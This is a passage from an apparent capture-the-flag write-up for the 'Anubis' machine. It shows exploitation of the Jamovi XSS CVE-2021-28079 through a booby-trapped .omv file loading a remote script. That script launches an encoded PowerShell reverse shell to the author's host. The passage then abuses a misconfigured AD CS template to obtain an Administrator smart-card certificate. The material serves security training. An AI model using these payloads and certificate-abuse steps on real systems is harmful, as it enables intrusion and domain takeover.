|S-chain|-<>-127.0.0.1:1080-<><>-172.21.0.1:445-<><>-OK
Enter WINDCORP\localadmin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```

I don’t have access to either of the admin shares (`ADMIN$` or `C$`), but I can at least read on the others.

`CertEnroll` implies Windows certificates are in use, specifically Active Directory Certificate Services. I abused this in the past in [Sizzle](/2019/06/01/htb-sizzle.html#generate-certificate-and-key-for-amanda), and will again later (though in a completely different way).

`Shared` is the most interesting. It has two folders:

```

oxdf@hacky$ smbclient //10.10.11.102/Shared -U windcorp.htb/localadmin Secret123
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 24 17:55:28 2022
  ..                                  D        0  Mon Jan 24 17:55:28 2022
  Documents                           D        0  Tue Apr 27 00:09:25 2021
  Software                            D        0  Thu Jul 22 14:14:16 2021

                9034239 blocks of size 4096. 3081022 blocks available

```

`Software` has what looks like some software installers:

```

smb: \Software\> ls
  .                                   D        0  Thu Jul 22 14:14:16 2021
  ..                                  D        0  Thu Jul 22 14:14:16 2021
  7z1900-x64.exe                      N  1447178  Mon Apr 26 17:10:08 2021
  jamovi-1.6.16.0-win64.exe           N 247215343  Mon Apr 26 17:03:30 2021
  VNC-Viewer-6.20.529-Windows.exe      N 10559784  Mon Apr 26 17:09:53 2021

                9034239 blocks of size 4096. 3084088 blocks available

```

A few directories into `Documents` there are a handful of `.omv` files:

```

smb: \Documents\Analytics\> ls
  .                                   D        0  Tue Apr 27 14:40:20 2021
  ..                                  D        0  Tue Apr 27 14:40:20 2021
  Big 5.omv                           A     6455  Tue Apr 27 14:39:20 2021
  Bugs.omv                            A     2897  Tue Apr 27 14:39:55 2021
  Tooth Growth.omv                    A     2142  Tue Apr 27 14:40:20 2021
  Whatif.omv                          A     2841  Mon Jan 24 17:49:59 2022

                9034239 blocks of size 4096. 3082522 blocks available

```

`.omv` seems to be associated with Jamovi, which is one of the installers above. It’s also worth noting that one of the files, `Whatif.omv` has a timestamp of today, whereas the rest are almost a year old.

### Jamovi CVE

#### Identify

Googling for Jamovi exploits, the first result is a very short [page on GitHub](https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md) talking about CVE-2021-28079. The researchers who found the CVE are theart42 and 4nqr34z, and the latter happens to be the creator or Anubis.

The vulnerability is a cross-site scripting (XSS) vulnerability in Jamovi <= 1.6.18, specifically in the implementation in the ElectronJS framework. The installer on the share is version 1.6.16, which then should be vulnerable.

The linked [video](https://www.youtube.com/watch?v=x94W2kzoBbc) shows opening a Jamovi file, followed by a request at the webserver and then a shell:

#### Exploit POC

I recorded my efforts getting the exploit to work [this video](https://www.youtube.com/watch?v=Gt5MFxirXr4):

I’ll show the highlights in the post below as well.

#### omv Files

An `.omv` file appears to just be a Zip archive:

```

oxdf@hacky$ file bugs.omv 
bugs.omv: Zip archive data, at least v2.0 to extract
oxdf@hacky$ unzip -l bugs.omv
Archive:  bugs.omv
  Length      Date    Time    Name
---------  ---------- -----   ----
      106  2021-04-27 11:39   META-INF/MANIFEST.MF
     2505  2021-04-27 11:39   index.html
     2391  2021-04-27 11:39   metadata.json
      422  2021-04-27 11:39   xdata.json
     4464  2021-04-27 11:39   data.bin
       50  2021-04-27 11:39   01 empty/analysis
---------                     -------
     9938                     6 files

```

The `index.html` file has some inline CSS and a reference section that has the Jamovi footer. `metadata.json` seems to be where the column names are stored.

#### Jamovi

Because the details on the CVE are so sparse, I’ll install Jamovi in a Windows VM using the installer from the share and see how it opens some of the files. The program itself looks kind of like Excel with the statistical stuff right out front:

![image-20220125160705141](https://0xdfimages.gitlab.io/img/image-20220125160705141.png)

Opening it also includes a nice message about how this version is exploitable.

I used `bugs.omv` to playwith, and opening it, there’s some data:

![image-20220125160802830](https://0xdfimages.gitlab.io/img/image-20220125160802830.png)

Double clicking on one of the column headers give the chance to edit it:

![image-20220125160827737](https://0xdfimages.gitlab.io/img/image-20220125160827737.png)

Given the vulnerability is XSS, added `<script>alert(1)</script>` after “Gender”. Interesting, using the “Save” and “Save As” options fail, I think because of some validation on the modified column header. But closing prompts for saving, and that doesn’t object:

![image-20220125161159297](https://0xdfimages.gitlab.io/img/image-20220125161159297.png)

On reopening:

![image-20220125161220231](https://0xdfimages.gitlab.io/img/image-20220125161220231.png)

Now I’ll start a Python webserver and try to get Jamovi to load a script. I’ll update the header to:

```

Gender<script src="http://127.0.0.1:8000/sploit.js"></script>

```

On opening now, there’s a request at the webserver (which returns 404):

```

PS > python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [25/Jan/2022 13:13:48] code 404, message File not found
127.0.0.1 - - [25/Jan/2022 13:13:48] "GET /sploit.js HTTP/1.1" 404 -

```

To get execution in Electron, I just need to use `require('child_process').spawn([cmd])`. I’ll write a really short `sploit.js` file:

```

require('child_process').spawn('calc.exe')

```

Now on opening:

![image-20220125161620034](https://0xdfimages.gitlab.io/img/image-20220125161620034.png)

### RCE on Anubis

Because `Whatif.omv` is the one with changing timestamps, I’ll open it up and edit it. I believe I can do this either in Jamovi or with zip, but the native application seems faster. I’ll open it and edit one of the columns to load script from my host:

![image-20220125162253831](https://0xdfimages.gitlab.io/img/image-20220125162253831.png)

I’ll upload it to Anubis and wait to see if I get a hit:

```

smb: \Documents\Analytics\> put Whatif.omv 
putting file Whatif.omv as \Documents\Analytics\Whatif.omv (9.7 kb/s) (average 9.7 kb/s)

```

In the mean time, I’ll work on a payload. I took the shell I used for the foothold and encoded it (making sure to convert to UTF-16LE like Windows expects):

```

oxdf@hacky$ cat rev.ps1 | iconv -t utf-16le | base64 -w 0
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=

```

Now I can add that to `sploit.js`:

```

require('child_process').spawn("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA");

```

Something seems to happen every five minutes, and on the next run:

```
10.10.11.102 - - [25/Jan/2022 17:01:57] "GET /sploit.js HTTP/1.1" 200 -

```

Followed by a shell about 30 seconds later:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.102 62969
whoami
windcorp\diegocruz
PS C:\Shared\Documents\Analytics>

```

From here I can grab `user.txt`:

```

PS C:\Users\diegocruz\desktop> type user.txt
6fd4ff39************************

```

## Shell as administrator

### Enumeration

#### Groups

Looking at DiegoCruz, the user is in a non-standard group, `webdevelopers`, which can be seen in `whoami /groups`:

```

PS C:\Windows\system32> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
WINDCORP\webdevelopers                     Group            S-1-5-21-3510634497-171945951-3071966075-3290 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

```

As well as `net user diegocruz`:

```

PS C:\Windows\system32> net user diegocruz
User name                    DiegoCruz
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 5:42:38 PM
Password expires             Never
Password changeable          5/27/2021 5:42:38 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory               
Last logon                   1/26/2022 2:09:57 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *webdevelopers        
The command completed successfully.

```

It’s not immediately clear what this buys me, but it’s worth noting.

#### Certificate Services

I noted earlier that there was a `CertEnroll` share on SMB, which is part of Active Directory Certificate Services. `net start` will print a list of all the running services, and that includes “Active Directory Certificate Services” (I’ll use `findstr` to show just that line):

```

PS C:\Windows\system32> net start | findstr /i cert
   Active Directory Certificate Services

```

`certutil` can tell us information about the environment:

```

PS C:\Windows\system32> certutil
Entry 0: (Local)
  Name:                         "windcorp-CA"
  Organizational Unit:          ""
  Organization:                 ""
  Locality:                     ""
  State:                        ""
  Country/region:               ""
  Config:                       "earth.windcorp.htb\windcorp-CA"
  Exchange Certificate:         ""
  Signature Certificate:        "earth.windcorp.htb_windcorp-CA.crt"
  Description:                  ""
  Server:                       "earth.windcorp.htb"
  Authority:                    "windcorp-CA"
  Sanitized Name:               "windcorp-CA"
  Short Name:                   "windcorp-CA"
  Sanitized Short Name:         "windcorp-CA"
  Flags:                        "13"
  Web Enrollment Servers: 
1
2
0
https://earth.windcorp.htb/windcorp-CA_CES_Kerberos/service.svc/CES
0
CertUtil: -dump command completed successfully.

```

I’ll need some of those details later. Certificate templates are collections of policy/settings that define a specific certificate that can be generated. The `-catemplates` flag will give a list of certificate templates:

```

PS C:\Windows\system32> certutil -catemplates
Web: Web -- Auto-Enroll
DirectoryEmailReplication: Directory Email Replication -- Access is denied.
DomainControllerAuthentication: Domain Controller Authentication -- Access is denied.
KerberosAuthentication: Kerberos Authentication -- Access is denied.
EFSRecovery: EFS Recovery Agent -- Access is denied.
EFS: Basic EFS -- Auto-Enroll: Access is denied.
DomainController: Domain Controller -- Access is denied.
WebServer: Web Server -- Access is denied.
Machine: Computer -- Access is denied.
User: User -- Auto-Enroll: Access is denied.
SubCA: Subordinate Certification Authority -- Access is denied.
Administrator: Administrator -- Access is denied.
CertUtil: -CATemplates command completed successfully.

```

All but the first return “Access is denied”. But the first one, `Web`, it seems that DiegoCruz has access. This is more clearly seen with [Certify](https://github.com/GhostPack/Certify). I can grab a pre-compiled version from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/Certify.exe), upload it to Anubis, and run it with the `find` subcommand. This command gives information about each template.

```

PS C:\programdata> .\certify.exe find
...[snip]..
    CA Name                               : earth.windcorp.htb\windcorp-CA
    Template Name                         : Web
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
        All Extended Rights         : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
      Object Control Permissions
        Owner                       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
        Full Control Principals     : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteOwner Principals       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteDacl Principals        : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteProperty Principals    : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
                                      
Certify completed in 00:00:12.5470812

```

There’s two interesting bits about this last template `Web` that sets it apart from the others. First, for all the other templates, the permissions are limited to `Domain Admins` and `Enterprise Admins`. However, this template also allows “All Extended Rights” to webdevelopers (a group which DiegoCruz is a member).

The second interesting bit is that the `ENROLLEE_SUPPLIES_SUBJECT` flag is set. In this [very detailed post about exploiting AD CS](https://posts.specterops.io/certified-pre-owned-d95910965cd2) from SpectreOps, they provide a similar example:

> **The certificate template allows requesters to specify a subjectAltName (SAN) in the CSR**. If a requester can specify the SAN in a CSR, the requester can request a certificate as anyone (e.g., a domain admin user). The certificate template’s AD object specifies if the requester can specify the SAN in its *mspki-certificate-name-flag* property. The mspki-certificate-name-flag property is a bitmask and if the [CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1) flag is present, a requester can specify the SAN. This is surfaced as the “Supply in request” option in the “Subject Name” tab in certtmpl.msc.

There is one challenge about this template - the use of it is only for Server Authentication, which won’t help me to generate a certificate for a user. *However*, DiegoCruz has “Full Control” over this template, so I can change that.

### Generate Administrator Certificate

#### Update Template for Smartcard Auth

[This writeup from Elkement](https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/#08) lays out the attack path going forward (I’m about to be at step 08). I’ll modify the template to allow for Smart Card Logon:

```

PS C:\programdata> $EKUs=@("1.3.6.1.5.5.7.3.2", "1.3.6.1.4.1.311.20.2.2")
PS C:\programdata> Set-ADObject "CN=Web,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb" -Add @{pKIExtendedKeyUsage=$EKUs;"msPKI-Certificate-Application-Policy"=$EKUs}

```

These commands are directly from the post, changing out the common name from WebServer2 to Web. Now if I re-run `certify.exe`, it shows these updates:

```

PS C:\programdata> .\certify find
...[snip]...
    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
...[snip]...

```

#### Generate Cert Request

Back on my Linux VM, I’ll modify the script from [the post step 09](https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/#09) to match the Anubis domain:

```

cnffile="admin.cnf"
reqfile="admin.req"
keyfile="admin.key"

dn="/DC=htb/DC=windcorp/CN=Users/CN=Administrator"

cat > $cnffile <<EOF
[ req ]
default_bits = 2048
prompt = no
req_extensions = user
distinguished_name = dn

[ dn ]
CN = Administrator

[ user ]
subjectAltName = otherName:msUPN;UTF8:administrator@windcorp.htb

EOF

openssl req -config $cnffile -subj $dn -new -nodes -sha256 -out $reqfile -keyout $keyfile

```

On running the script, it generates a key and a request:

```

oxdf@hacky$ ./gen_request.sh 
Generating a RSA private key
......................................................................+++++
...................................................+++++
writing new private key to 'admin.key'
-----
oxdf@hacky$ ls admin.*
admin.cnf  admin.key  admin.req

```

#### Get Request Signed

In [Sizzle](/2019/06/01/htb-sizzle.html#generate-certificate-and-key-for-amanda), I submitted these requests to the web application for Certificate requests. However here, I don’t have creds for DiegoCruz to authenticate to the application. I’ll have to use the command line alternatives. I’ll upload the request to Anubis:

```

PS C:\programdata> curl http://10.10.14.6/admin.req -outfile admin.req

```

I’ll need the CA name from `certutil` output above, `earth.windcorp.htb\windcorp-CA`. I’ll pass `certreq` that along with the template name, the request, and the output filename:

```

PS C:\programdata> certreq -submit -config earth.windcorp.htb\windcorp-CA -attrib "CertificateTemplate:Web" admin.req admin.cer
RequestId: 7
RequestId: "7"
Certificate retrieved(Issued) Issued  The certificate validity period will be shorter than the Web Certificate Template specifies, because the template validity period is longer than the maximum certificate validity period allowed by the CA.  Consider renewing the CA certificate, reducing the template validity period, or increasing the registry validity period.

```

It is really important to get this command correct, or it will pop up on the user’s desktop. For example, if you leave off the output filename:

![image-20220126102950580](https://0xdfimages.gitlab.io/img/image-20220126102950580.png)

This generates `admin.cer` and `admin.rsp`. `admin.cer` is a base64 encoded file so I can `cat` it and copy it back to my host.

```

PS C:\programdata> cat admin.cer 
-----BEGIN CERTIFICATE-----
MIIF4TCCBMmgAwIBAgITMwAAAANeb1z+pU/eBgAAAAAAAzANBgkqhkiG9w0BAQsF
ADBFMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYId2luZGNv
cnAxFDASBgNVBAMTC3dpbmRjb3JwLUNBMB4XDTIyMDEyNjIxMzI1N1oXDTI0MDEy
NjIxNDI1N1owVzETMBEGCgmSJomT8ixkARkWA2h0YjEYMBYGCgmSJomT8ixkARkW
...[snip]...

```

This command shows that it worked:

```

oxdf@hacky$ openssl x509 -in admin.cer -text -noout 
Certificate:
    Data:                                 
        Version: 3 (0x2)
        Serial Number:
            33:00:00:00:03:5e:6f:5c:fe:a5:4f:de:06:00:00:00:00:00:03
        Signature Algorithm: sha256WithRSAEncryption 
        Issuer: DC = htb, DC = windcorp, CN = windcorp-CA
        Validity
            Not Before: Jan 26 21:32:57 2022 GMT
            Not After : Jan 26 21:42:57 2024 GMT
        Subject: DC = htb, DC = windcorp, CN = Users, CN = Administrator
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:d4:8d:be:bd:1a:90:5a:02:15:e9:06:ce:d9:ad:
                    ca:98:62:52:f3:ec:48:77:e8:1a:67:94:a3:e3:49:
...[snip]...
                    04:e3
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Alternative Name: 
                othername:<unsupported>
            X509v3 Subject Key Identifier: 
                6A:E1:D2:36:25:A7:3C:BD:9E:05:7F:32:76:80:E1:B4:44:3D:02:FC
            X509v3 Authority Key Identifier: 
                keyid:10:50:07:F6:7B:65:39:68:3B:8B:FE:BB:38:BB:47:8D:CD:B8:FF:18

            X509v3 CRL Distribution Points: 

                Full Name:
                  URI:ldap:///CN=windcorp-CA,CN=earth,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb?certificateRevocationList?base?objectClass=cRLDistributionPoint

            Authority Information Access: 
                CA Issuers - URI:ldap:///CN=windcorp-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb?cACertificate?base?objectClass=certificationAuthority

            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            1.3.6.1.4.1.311.21.7: 
                0,.$+.....7...."...........T..3&...S......d...
            X509v3 Extended Key Usage: 
                Microsoft Smartcard Login, TLS Web Client Authentication, TLS Web Server Authentication
            1.3.6.1.4.1.311.21.10: 
                0&0..
+.....7...0
..+.......0
..+.......
    Signature Algorithm: sha256WithRSAEncryption
         38:fd:23:4b:d3:f6:77:1c:c0:6a:25:44:33:8e:60:73:7c:44:
         74:5e:16:b1:ca:11:4a:ae:f5:87:59:51:19:8e:d5:1b:22:fa:
...[snip]...

```

Of note, the subject is Administrator and the “Extended Key Usage” includes smartcard login. This is all I need to authenticate as the administrator account.

### Configure Kerberos

#### Install Packages

To use Kerberos auth from my VM, I’ll need install a couple packages:

```

oxdf@hacky$ sudo apt install krb5-user krb5-pkinit                      
...[snip]...

```

On installing, it will ask for my default realm (`windcorp.htb`) and then for a couple server names (I’ll give “earth.windcorp.htb” for all of these). This starts the `/etc/krb5.conf` file, but I’ll wipe it and create a new one based on the Elkement post [step 11](https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/#11), [12](https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/#12), [13](https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/#13), and [14](https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/#14).

#### Get CA Certificate

I need the CA certificate. I can get this using `certutil` on Anubis (I could have also obtained this from the web application on `softwareportal.windcorp.htb/certsrv` or from the SMB share). [All](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/export-root-certification-authority-certificate) [the](https://www.prajwaldesai.com/export-root-ca-certificate-for-configmgr/) [references](https://ss64.com/nt/certutil.html) I found showed running `certutil -ca.cert [out file]`, but this failed:

```

PS C:\programdata> certutil -ca.cert ca.cer
Expected no more than 1 args, received 2
CertUtil: Too many arguments

Usage:
  CertUtil [Options] -CA [CAName | TemplateName]
  Display Enrollment Policy CAs

Options:
  -f                -- Force overwrite
  -user             -- Use HKEY_CURRENT_USER keys or certificate store
  -Unicode          -- Write redirected output in Unicode
  -gmt              -- Display times as GMT
  -seconds          -- Display times with seconds and milliseconds
  -Silent           -- (-q) Use silent flag to acquire crypt context
  -split            -- Split embedded ASN.1 elements, and save to files
  -v                -- Verbose operation
  -privatekey       -- Display password and private key data
  -pin PIN                  -- Smart Card PIN
  -PolicyServer URLOrId     -- Policy Server URL or Id
    For selection U/I, use -PolicyServer -
    For all Policy Servers, use -PolicyServer *
  -Anonymous        -- Use anonymous SSL credentials
  -Kerberos         -- Use Kerberos SSL credentials
  -ClientCertificate ClientCertId -- Use X.509 Certificate SSL credentials
    For selection U/I, use -ClientCertificate -
  -UserName UserName        -- Use named account for SSL credentials
    For selection U/I, use -UserName -
  -p Password               -- Password
  -sid WELL_KNOWN_SID_TYPE  -- Numeric SID
            22 -- Local System
            23 -- Local Service
            24 -- Network Service

CertUtil -?              -- Display a verb list (command list)
CertUtil -CA -?          -- Display help text for the "CA" verb
CertUtil -v -?           -- Display all help text for all verbs

```

It’s saying too many arguments. If I leave off the output name it works, but not what I was looking for:

```

PS C:\programdata> certutil -ca.cert
  Name: Active Directory Enrollment Policy
  Id: {43481048-91B1-43AA-93DF-F22262486073}
  Url: ldap:
1 CAs:
CertUtil: -CA command completed successfully.

```

It thinks I’m trying to run the `-CA` sub command, not `-ca.cert`. I played with quotes and other formatting, but eventually tried `/ca.cert` and it worked:

```

PS C:\programdata> certutil /ca.cert ca.cer
CA cert[0]: 3 -- Valid
CA cert[0]:
-----BEGIN CERTIFICATE-----
MIIDfTCCAmWgAwIBAgIQNkWTCnXFyLpKrApciD3uYDANBgkqhkiG9w0BAQsFADBF
MRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYId2luZGNvcnAx
FDASBgNVBAMTC3dpbmRjb3JwLUNBMB4XDTIxMDUyNDE3NDgwN1oXDTM2MDUyNDE3
NTgwN1owRTETMBEGCgmSJomT8ixkARkWA2h0YjEYMBYGCgmSJomT8ixkARkWCHdp
bmRjb3JwMRQwEgYDVQQDEwt3aW5kY29ycC1DQTCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBALRJHvqFcY2Ic4NNucXGRIePNt7xsuwFaJ7MYBUa9C2hr0Nw
32UGSS55AV31HJlYRlx28j8UL61pHfTe23sXhGIdHM1fjqrc4Q8dAsqz0g4sJ74F
BEHRwFI+UD+cc3Tgm7IaWA2cWlFB1zsvxIQwwhzyq1PegWsOgmW9UEufyOIvgfxb
AOsnTLXwS72Bw/K58Ikhn/wBU45b6CBkX4oL+9eM4xHwxcO0j3uvdgXrJxtmCYKK
EkGNGJn3iyi5qnLCfUR38fY4SNcOwEqTUlI1l08yIT4cpzlp8HMHy9k93JTHx0SG
vuMCsFgOzyR57qk51YTzoBr6+FwQboln3ejlVrECAwEAAaNpMGcwEwYJKwYBBAGC
NxQCBAYeBABDAEEwDgYDVR0PAQH/BAQDAgGGMA8GA1UdEwEB/wQFMAMBAf8wHQYD
VR0OBBYEFBBQB/Z7ZTloO4v+uzi7R43NuP8YMBAGCSsGAQQBgjcVAQQDAgEAMA0G
CSqGSIb3DQEBCwUAA4IBAQCrI7eIMHhE29WKAUL2WF8Uuqoa9Lh9+/VKYTX+m/QJ
NLsN/Lid020UGgSTCikE5EKbnfhJnVFSmMfx8TUfnFN/0UoqQAocD0uqdmMaRH+A
